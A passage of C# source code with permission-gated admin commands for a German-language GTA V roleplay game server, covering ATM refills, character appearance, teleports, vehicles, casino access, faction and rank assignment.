        [Command(GreedyArg = true)]
        public void fillatm(Player player, string args)
        {
            try
            {
                var dbPlayer = player.GetPlayer();
                if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

                if (!UInt32.TryParse(args, out uint id)) return;
                BankModule.Instance.GetAll().Values.ToList().ForEach(atm =>
                {
                    if (id != 0 && atm.Id == id && atm.Type == 1)
                    {
                        if (atm == null)
                        {
                            dbPlayer.SendNewNotification("ATM nicht gefunden");
                            return;
                        }
                        atm.ActMoney = Convert.ToInt32(Convert.ToDouble(atm.MaxMoney) * 0.7);
                        atm.SaveActMoneyToDb();
                        dbPlayer.SendNewNotification($"ATM {atm.Id} befüllt!");
                        return;
                    }
                });
                if (id == 0)
                {
                    string query = $"UPDATE `bank` SET actual_money = max_money * 0.7 WHERE type = '1';";
                    MySQLHandler.ExecuteAsync(query);
                }
                dbPlayer.SendNewNotification("ATMs befüllt.");
            }
            catch (Exception ex)
            {
                Logging.Logger.Crash(ex);
                return;
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void testchar(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            ComponentManager.Get<CustomizationWindow>().Show()(dbPlayer, dbPlayer.Customization);

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void setbart(Player player, string bartid)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            AppearanceItem appearanceItem = new AppearanceItem((byte)Convert.ToInt32(bartid), 255.0f);

            dbPlayer.Customization.Appearance[1] = appearanceItem;

            dbPlayer.SaveCustomization();
            dbPlayer.ApplyCharacter();

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void setchest(Player player, string chestid)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            AppearanceItem appearanceItem = new AppearanceItem((byte)Convert.ToInt32(chestid), 255.0f);

            dbPlayer.Customization.Appearance[10] = appearanceItem;

            dbPlayer.SaveCustomization();
            dbPlayer.ApplyCharacter();

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void sethair(Player player, string bartid)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            HairData hairData = new HairData((byte)Convert.ToInt32(bartid), 0, 2);

            dbPlayer.Customization.Hair = hairData;

            dbPlayer.SaveCustomization();
            dbPlayer.ApplyCharacter();

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void cleartattoo(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            dbPlayer.Customization.Tattoos.Clear();
            dbPlayer.SaveCustomization();
            dbPlayer.ApplyCharacter();
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void fixveh(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            var sxVeh = dbPlayer.Player.Vehicle.GetVehicle();
            if (sxVeh == null) return;
            sxVeh.Repair();
            sxVeh.fuel = sxVeh.Data.Fuel;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void guideduty(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            if (!dbPlayer.IsInGuideDuty())
            {
                dbPlayer.SetGuideDuty(true);
                Players.Players.Instance.SendMessageToAuthorizedUsers("dutyinfo",
                    dbPlayer.Rank.Name + " " + dbPlayer.GetName() + " ist nun im " + dbPlayer.Rank.Name + "dienst!");
                dbPlayer.SendNewNotification("Sie befinden sich nun im " + dbPlayer.Rank.Name + "dienst!");

            }
            else
            {
                dbPlayer.SetGuideDuty(false);
                Players.Players.Instance.SendMessageToAuthorizedUsers("dutyinfo",
                    dbPlayer.Rank.Name + " " + dbPlayer.GetName() + " ist nun nicht mehr im " + dbPlayer.Rank.Name + "dienst!");
                dbPlayer.SendNewNotification("Sie befinden sich nun nicht mehr im " + dbPlayer.Rank.Name + "dienst!");
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void acduty(Player player)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!dbPlayer.IsInGameDesignDuty())
            {
                dbPlayer.SetGameDesignDuty(true);

                int maskId = 135;
                int chestId = 287;
                int leggingsId = 114;
                int bootId = 78;
                int bodyId = 166;

                string skinModel = "FreeModeMale01";

                if (dbPlayer.Customization.Gender == 1)
                {
                    chestId = 300;
                    leggingsId = 121;
                    bootId = 82;
                    bodyId = 207;
                    dbPlayer.SetClothes(8, 2, 0);
                    skinModel = "FreeModeFemale01";
                }
                else
                {
                    dbPlayer.SetClothes(8, 15, 0);
                }

                if (!Enum.TryParse(skinModel, true, out PedHash skin)) return;

                dbPlayer.SetSkin(skin);

                int color = 0;

                switch (dbPlayer.Rank.Id)
                {
                    case 13:
                        color = 7;
                        break;
                    case 14:
                        color = 10;
                        break;
                    case 23:
                        color = 10;
                        break;
                    case 25:
                        color = 10;
                        break;
                    case 26:
                        color = 10;
                        break;
                    default:
                        break;
                }

                dbPlayer.SetClothes(1, maskId, color);
                dbPlayer.SetClothes(11, chestId, color);
                dbPlayer.SetClothes(4, leggingsId, color);
                dbPlayer.SetClothes(6, bootId, color);
                dbPlayer.SetClothes(3, bodyId, 12);
                dbPlayer.SetClothes(2, 0, 0);
                dbPlayer.SetClothes(9, 0, 0);

                Players.Players.Instance.SendMessageToAuthorizedUsers("dutyinfo", dbPlayer.Rank.Name + " " + dbPlayer.GetName() + " ist nun im " + dbPlayer.Rank.Name + " Dienst!");
                dbPlayer.SendNewNotification("Sie befinden sich nun im " + dbPlayer.Rank.Name + " Dienst!");
            }
            else
            {
                dbPlayer.SetGameDesignDuty(false);
                Players.Players.Instance.SendMessageToAuthorizedUsers("dutyinfo", dbPlayer.Rank.Name + " " + dbPlayer.GetName() + " ist nun nicht mehr im " + dbPlayer.Rank.Name + " Dienst!");
                dbPlayer.SendNewNotification("Sie befinden sich nun nicht mehr im " + dbPlayer.Rank.Name + " Dienst!");
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void guideveh(Player player)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var dbPlayer = player.GetPlayer();
                if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

                if (!dbPlayer.HasData("guideveh"))
                {
                    dbPlayer.SendNewNotification("Sie haben ein Guide-Fahrzeug gespawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.SUCCESS);
                    NAPI.Task.Run(async () =>
                    {
                        SxVehicle Sxveh = VehicleHandler.Instance.CreateServerVehicle(1237, true, dbPlayer.Player.Position, dbPlayer.Player.Rotation.Z, 131, 131, dbPlayer.Player.Dimension, true, false, false, 0, dbPlayer.GetName(), 0, 999, (uint)dbPlayer.Id, 100, 1000, "", "", 0, null, null, true);

                        while (Sxveh.Entity == null)
                        {
                            await NAPI.Task.WaitForMainThread(100);
                        }

                        Vehicle myveh = Sxveh.Entity;

                        dbPlayer.SetData("guideveh", myveh);

                        await NAPI.Task.WaitForMainThread(2000);

                        if (myveh != null) player.SetIntoVehicleSave(myveh, 0);
                    });
                }
                else
                {
                    Vehicle xveh = dbPlayer.GetData("guideveh");
                    VehicleHandler.Instance.DeleteVehicleByEntity(xveh);
                    dbPlayer.SendNewNotification("Sie haben ein Guide-Fahrzeug despawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ERROR);
                    dbPlayer.ResetData("guideveh");
                }
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void aveh(Player player)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var dbPlayer = player.GetPlayer();
                if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

                if (!dbPlayer.HasData("adminveh"))
                {
                    dbPlayer.SendNewNotification("Sie haben ein Administrator Fahrzeug gespawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.SUCCESS);
                    var color = 64;
                    switch (dbPlayer.RankId)
                    {
                        case (int)AdminLevelTypes.Staff:
                            color = 145;
                            break;
                        case (int)AdminLevelTypes.ThirdLevelTeam:
                            color = 89;
                            break;
                        case (int)AdminLevelTypes.SecondLevelTeam:
                            color = 64;
                            break;
                        default:
                            if (dbPlayer.RankId >= (int)AdminLevelTypes.Management)
                                color = 44;
                            else if (dbPlayer.RankId == (int)AdminLevelTypes.FirstLevelTeam)
                                color = 92;
                            break;
                    }

                    NAPI.Task.Run(async () =>
                    {
                        SxVehicle myveh = VehicleHandler.Instance.CreateServerVehicle(
                            VehicleDataModule.Instance.GetDataByName("shotaro").Id, true,
                            dbPlayer.Player.Position, dbPlayer.Player.Rotation.Z, 1, color, dbPlayer.Player.Dimension,
                            true, false, false, 0,
                            dbPlayer.GetName(), 0, 999, (uint)dbPlayer.Id, 100, 1000, "", "", 0, null, null, true);

                        while (myveh.Entity == null)
                        {
                            await NAPI.Task.WaitForMainThread(100);
                        }
                        dbPlayer.SetData("adminveh", myveh.Entity);

                        player.SetIntoVehicleSave(myveh.Entity, 0);
                    });
                }
                else
                {
                    Vehicle xveh = dbPlayer.GetData("adminveh");
                    VehicleHandler.Instance.DeleteVehicleByEntity(xveh);
                    dbPlayer.SendNewNotification("Sie haben ein Administrator Fahrzeug despawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ERROR);
                    dbPlayer.ResetData("adminveh");
                }
            }));
        }




        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public async Task o(Player player, string text)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            await Chats.SendGlobalMessage($"{text}", COLOR.ORANGE, ICON.GLOB);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public async Task dev(Player player, string text)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;
            await Chats.SendGlobalMessage($" {dbPlayer.GetName()}: {text}", COLOR.RED, ICON.DEV);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async Task casinoopen(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;
            await Chats.SendGlobalMessage($"Diamond Casino : Das Casino hat nun geöffnet!", COLOR.LIGHTGREEN, ICON.CASINO);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async Task casinoclose(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;
            KasinoModule.Instance.CasinoGuests = new List<DbPlayer>();
            await Chats.SendGlobalMessage($"Diamond Casino : Das Casino schließt nun!", COLOR.LIGHTGREEN, ICON.CASINO);
        }



        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void time(Player player, string time)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;
            if (!int.TryParse(time, out var timeInt)) return;
            if (timeInt < 0 || timeInt > 23) return;
            NAPI.World.SetTime(timeInt, 0, 0);
        }

        [CommandPermission(PlayerRankPermission = true, AllowedDeath = true)]
        [Command(GreedyArg = true)]
        public void a(Player player, string message)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            Players.Players.Instance.SendChatMessageToAuthorizedUsers("adminchat", dbPlayer, message);
        }

        [CommandPermission(PlayerRankPermission = true, AllowedDeath = true)]
        [Command(GreedyArg = true)]
        public void h(Player player, string message)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            Players.Players.Instance.SendChatMessageToAuthorizedUsers("highteamchat", dbPlayer, message);
        }

        [CommandPermission(PlayerRankPermission = true, AllowedDeath = true)]
        [Command(GreedyArg = true)]
        public void t(Player player, string message)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            Players.Players.Instance.SendChatMessageToAuthorizedUsers("teamchat", dbPlayer, message);
        }

        [CommandPermission(PlayerRankPermission = true, AllowedDeath = true)]
        [Command(GreedyArg = true)]
        public void arev(Player player, string name)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            var findPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (findPlayer == null || findPlayer.IsAlive()) return;

            findPlayer.DimensionType[0] = DimensionType.World;
            findPlayer.Revive();

            dbPlayer.SendNewNotification("Sie haben " + findPlayer.GetName() + " revived!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            findPlayer.SendNewNotification("Administrator " + dbPlayer.GetName() + " hat Sie revived!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);

            PlayerSpawn.OnPlayerSpawn(findPlayer.Player);
            DatabaseLogging.Instance.LogAdminAction(player, dbPlayer.GetName(), AdminLogTypes.arev, $"{dbPlayer.GetName()} (ID: {dbPlayer.Id}) belebte {findPlayer.GetName()} (ID: {findPlayer.Id}) wieder.", 0, Configuration.Instance.DevMode);

        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void resetcasino(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;
            KasinoDevice device = KasinoModule.Instance.GetClosest(dbPlayer);

            if (device.IsInUse)
            {
                dbPlayer.SendNewNotification("casino reset successfully");
                device.IsInUse = false;
            }
            else
            {
                dbPlayer.SendNewNotification("casino not in use");
            }
        }





        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void casino(Player player, string name)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            var destinationDbPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (destinationDbPlayer == null || !destinationDbPlayer.IsValid()) return;


            if (KasinoModule.Instance.CasinoGuests.Contains(destinationDbPlayer))
            {
                dbPlayer.SendNewNotification($"Casino Zugang entzogen für Kunde {destinationDbPlayer.GetName()}", PlayerNotification.NotificationType.ERROR);
                KasinoModule.Instance.CasinoGuests.Remove(destinationDbPlayer);
            }
            else
            {
                dbPlayer.SendNewNotification($"Casino Zugang gewährt für Kunde {destinationDbPlayer.GetName()}", PlayerNotification.NotificationType.SUCCESS);
                KasinoModule.Instance.CasinoGuests.Add(destinationDbPlayer);
            }

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void cduty(Player player, string name)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            var findPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (findPlayer == null || !findPlayer.IsValid()) return;

            if (findPlayer.IsInCasinoDuty())
            {
                findPlayer.SetCasinoDuty(false);
                findPlayer.ApplyCharacter();
                dbPlayer.SendNewNotification($"Du hast {findPlayer.GetName()} erfolgreich in den Normalen Modus gesetzt alla", NotificationType.SUCCESS);
            }
            else
            {
                findPlayer.SetCasinoDuty(true);

                string pedhash = "";
                switch (findPlayer.Id)
                {
                    case 51035:
                        pedhash = "3488666811";
                        break;
                    case 37565:
                        pedhash = "337826907";
                        break;
                    case 57067:
                        pedhash = "736659122";
                        break;
                    default:
                        switch (findPlayer.Customization.Gender)
                        {
                            case 0:
                                pedhash = "520636071";
                                break;
                            case 1:
                                pedhash = "3163733717";
                                break;
                        }
                        break;
                }
                Enum.TryParse(pedhash, true, out PedHash skin);
                findPlayer.SetSkin(skin);

                dbPlayer.SendNewNotification($"Du hast {findPlayer.GetName()} erfolgreich in den Casino Modus gesetzt alla", NotificationType.ERROR);

            }
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void gotohouse(Player player, string houseId)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;
            if (!uint.TryParse(houseId, out var houseIdUInt)) return;
            var xHouse = HouseModule.Instance.Get(houseIdUInt);
            if (xHouse == null) return;

            dbPlayer.SetDimension(0);
            dbPlayer.DimensionType[0] = DimensionType.World;
            dbPlayer.Player.SetPosition(xHouse.Position);
            dbPlayer.SendNewNotification("Du hast dich zu Haus " + xHouse.Id + " teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void gotogarage(Player player, string garageName)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            Garage garage = null;

            if (uint.TryParse(garageName, out uint garageid))
                garage = GarageModule.Instance.GetAll().Values.Where(c => c.Id == garageid).FirstOrDefault();
            else
                garage = GarageModule.Instance.GetAll().Values.Where(c => c.Name.ToLower().Contains(garageName.ToLower())).FirstOrDefault();

            if (garage == null) return;

            dbPlayer.SetDimension(0);
            dbPlayer.DimensionType[0] = DimensionType.World;
            dbPlayer.Player.SetPosition(garage.Position);
            dbPlayer.SendNewNotification($"Du hast dich zur Garage {garage.Name}({garage.Id}) teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);

            return;

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void godebug(Player player, string farmId)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            if (!uint.TryParse(farmId, out var farmIdUInt)) return;
            var xFarm = Farming.FarmPositionModule.Instance.Get(farmIdUInt);
            if (xFarm == null) return;

            dbPlayer.SetDimension(0);
            dbPlayer.DimensionType[0] = DimensionType.World;
            dbPlayer.Player.SetPosition(xFarm.Position);
            dbPlayer.SendNewNotification("Du hast dich zum Farm Spot " + xFarm.Id + " teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void gotofarm(Player player, string farmId)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            if (!uint.TryParse(farmId, out var farmIdUInt)) return;
            var xFarm = Farming.FarmPositionModule.Instance.Get(farmIdUInt);
            if (xFarm == null) return;

            dbPlayer.SetDimension(0);
            dbPlayer.DimensionType[0] = DimensionType.World;
            dbPlayer.Player.SetPosition(xFarm.Position);
            dbPlayer.SendNewNotification("Du hast dich zum Farm Spot " + xFarm.Id + " teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void gotofarmdebug(Player player, string farmId)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            if (!uint.TryParse(farmId, out var farmIdUInt)) return;
            var xFarm = Farming.FarmPositionModule.Instance.Get(farmIdUInt);
            if (xFarm == null) return;

            dbPlayer.SetDimension(0);
            dbPlayer.DimensionType[0] = DimensionType.World;
            dbPlayer.Player.SetPosition(xFarm.Position);
            dbPlayer.SendNewNotification("Du hast dich zum Farm Spot " + xFarm.Id + " teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void go(Player player, string name)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            var destinationPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (destinationPlayer == null) return;

            NAPI.Task.Run(() =>
            {
                if (dbPlayer.RageExtension.IsInVehicle)
                {
                    dbPlayer.Player.Vehicle.Position = destinationPlayer.Player.Position;
                    dbPlayer.Player.Vehicle.Dimension = destinationPlayer.Player.Dimension;
                }
                else
                {
                    dbPlayer.Player.SetPosition(destinationPlayer.Player.Position);
                }
            });

            dbPlayer.DimensionType[0] = destinationPlayer.DimensionType[0];
            dbPlayer.SetDimension(destinationPlayer.Player.Dimension);

            // TODO: Find solution for particle effect
            //dbPlayer.Player.CreateParticleEffect("scr_rcbarry1", "scr_alien_teleport", new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1);
            dbPlayer.SendNewNotification("Sie haben sich zu " + destinationPlayer.GetName() +
                                     " teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);

            if (dbPlayer.NoClip)
            {
                dbPlayer.Player.TriggerNewClient("gotocam", NAPI.Util.ToJson(destinationPlayer.Player.Position));
            }

            if (dbPlayer.Rank.CanAccessFeature("silentTeleport")) return;
            if (dbPlayer.IsInGuideDuty())
            {
                destinationPlayer.SendNewNotification("Guide " + destinationPlayer.GetName() +
                                                  " hat sich zu ihnen teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
            else if (dbPlayer.RankId < 6)
            {
                destinationPlayer.SendNewNotification("Administrator " + dbPlayer.GetName() +
                                                  " hat sich zu ihnen teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void makeceo(Player p_Player, string p_Args)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var l_Player = p_Player.GetPlayer();
                if (l_Player == null)
                    return;

                if (!l_Player.CanAccessMethod())
                {
                    l_Player.SendNewNotification(GlobalMessages.Error.NoPermissions());
                    return;
                }

                var l_Command = p_Args.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                if (l_Command.Length <= 1)
                {
                    l_Player.SendNewNotification("/makeceo business_id spieler_name", title: "SYNTAX", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                bool l_Result = UInt32.TryParse(l_Command[1], out uint l_TeamID);
                if (!l_Result)
                {
                    l_Player.SendNewNotification("Falsche Business ID!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var l_Business = BusinessModule.Instance.GetById(l_TeamID);
                if (l_Business == null)
                {
                    l_Player.SendNewNotification("Falsche Business ID!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var l_TargetPlayer = Players.Players.Instance.FindPlayer(l_Command[0], true);
                if (l_TargetPlayer == null)
                {
                    l_Player.SendNewNotification("Spieler nicht gefunden!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                l_TargetPlayer.AddBusinessOwnership(l_Business);
                l_TargetPlayer.UpdateApps();
                l_TargetPlayer.ActiveBusinessId = l_Business.Id;
            }));
        }

        //da war was komisch. besonders testen.
        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void makeleader(Player player, string commandParams)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var iPlayer = player.GetPlayer();

                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                    return;
                }

                var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                if (command.Length <= 1) return;
                uint teamId;

                bool result = UInt32.TryParse(command[1], out teamId);
                if (!result || TeamModule.Instance[teamId] == null)
                {
                    iPlayer.SendNewNotification("Falsche Team ID!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
                if (findPlayer == null) return;

                findPlayer.RemoveParamedicLicense();

                findPlayer.SetTeam(teamId);
                findPlayer.SetTeamRankPermission(true, 2, true, "");

                findPlayer.SendNewNotification("Administrator " + iPlayer.GetName() +
                                           " hat Sie zum Leader der Fraktion " + TeamModule.Instance.Get(teamId).Name +
                                           " ernannt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                iPlayer.SendNewNotification("Sie haben " + findPlayer.GetName() +
                                        " zum Leader der Fraktion " + TeamModule.Instance.Get(teamId).Name + " ernannt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                findPlayer.UpdateApps();
                findPlayer.Player.TriggerNewClient("updateDuty", false);
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setfaction(Player player, string commandParams)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var iPlayer = player.GetPlayer();

                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                    return;
                }

                var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                if (command.Length <= 1) return;

                bool result = UInt32.TryParse(command[1], out uint teamId);
                if (!result || TeamModule.Instance[teamId] == null)
                {
                    iPlayer.SendNewNotification("Falsche Team ID!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
                if (findPlayer == null) return;

                findPlayer.RemoveParamedicLicense();

                findPlayer.SetTeamRankPermission(false, 0, false, "");
                findPlayer.SetTeam(teamId);
                findPlayer.TeamRank = 0;

                if (findPlayer.GetName() != iPlayer.GetName())
                    findPlayer.SendNewNotification("Administrator " + iPlayer.GetName() +
                                               " hat Sie zum Mitglied der Fraktion " + TeamModule.Instance.Get(teamId).Name +
                                               " ernannt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);

                iPlayer.SendNewNotification(findPlayer.GetName() +
                                        " in Fraktion " + TeamModule.Instance.Get(teamId).Name + " gesetzt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);

                findPlayer.UpdateApps();
                findPlayer.Player.TriggerNewClient("updateDuty", false);
            }));
        }

        //da war was komisch. besonders testen.
        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setfrang(Player player, string commandParams)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var iPlayer = player.GetPlayer();

                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                    return;
                }

                var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                if (command.Length <= 1) return;
                uint teamId;

                bool result = UInt32.TryParse(command[1], out teamId);
                if (!result || teamId < 0 || teamId > 13)
                {
                    iPlayer.SendNewNotification("Ungültiger Rang", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
                if (findPlayer == null) return;

                findPlayer.TeamRank = teamId;
                iPlayer.SendNewNotification($"Teamrang von {findPlayer.GetName()} auf {teamId} gesetzt");
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setrank(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            try
            {
                var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                if (command.Length <= 1) return;

                int value;
                bool result = Int32.TryParse(command[1], out value);
                if (!result)
                {
                    iPlayer.SendNewNotification("Not a number!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);

                if (findPlayer == null) return;

                Rank rank = RankModule.Instance.Get((uint)value);

                if (rank == null) return;
                findPlayer.SetRank((uint)value);
                findPlayer.Rank = rank;

                iPlayer.SendNewNotification("Sie haben den Rang von " + findPlayer.GetName() +
                                            " auf " + rank.Name + " gesetzt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
            catch (Exception ex)
            {
                Logging.Logger.Crash(ex);
                return;
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setarmor(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            try
            {
                var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                if (command.Length <= 1) return;

                int value;
                bool result = Int32.TryParse(command[1], out value);
                if (!result)
                {
                    iPlayer.SendNewNotification("Not a number!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);

                if (findPlayer == null) return;

                findPlayer.SetArmorPlayer(value);
                iPlayer.SendNewNotification("Sie haben die Ruestung von " + findPlayer.GetName() +
                                        " auf " + value + " gesetzt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
            catch (Exception ex)
            {
                Logging.Logger.Crash(ex);
                return;
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async void sethandmoney(Player player, string commandParams)
        {
            await AsyncCommands.Instance.SetHandMoney(player, commandParams);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async void setblackmoney(Player player, string commandParams)
        {
            await AsyncCommands.Instance.SetBlackMoney(player, commandParams);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setmoney(Player player, string commandParams)
        {
            try
            {
